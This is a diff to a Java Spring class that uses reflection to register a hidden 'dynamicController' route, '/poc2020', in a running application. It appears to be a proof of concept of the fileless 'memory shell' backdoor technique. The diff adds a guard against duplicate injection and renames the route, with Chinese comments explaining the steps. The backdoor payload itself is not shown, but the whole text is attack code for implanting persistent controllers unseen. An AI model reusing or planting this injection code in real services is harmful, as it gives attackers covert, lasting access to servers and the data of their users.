@@ -6,7 +6,11 @@ import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.context.ContextLoader;
 import org.springframework.web.context.request.RequestContextHolder;
 import org.springframework.web.context.support.XmlWebApplicationContext;
+import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
+import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
+
 import java.lang.reflect.Method;
+import java.util.Set;
 
 @Controller
 public class ControllerBased{
@@ -32,8 +36,16 @@ public class ControllerBased{
             //continue
         }
 
+
         try{
             Object requestMappingHandlerMapping = context.getBean(Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping"));
+            // 防止重复添加，重复添加会导致不可用
+            Set<RequestMappingInfo> mappingInfos = ((RequestMappingHandlerMapping)requestMappingHandlerMapping).getHandlerMethods().keySet();
+            for(RequestMappingInfo requestMappingInfo : mappingInfos){
+                if(requestMappingInfo.toString().contains("/poc2020")){
+                    return "failed";
+                }
+            }
             Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("detectHandlerMethods", Object.class);
             method.setAccessible(true);
             method.invoke(requestMappingHandlerMapping, "dynamicController");
@@ -50,7 +62,7 @@ public class ControllerBased{
             Method method = Class.forName("org.springframework.web.servlet.handler.AbstractUrlHandlerMapping").getDeclaredMethod("registerHandler", String.class, Object.class);
             method.setAccessible(true);
             // 4. 将 dynamicController 和 URL 注册到 handlerMap 中
-            method.invoke(dh, "/poc", "dynamicController");
+            method.invoke(dh, "/poc2020", "dynamicController");
             return "success";
         }catch(Exception e){
             System.out.println(e);
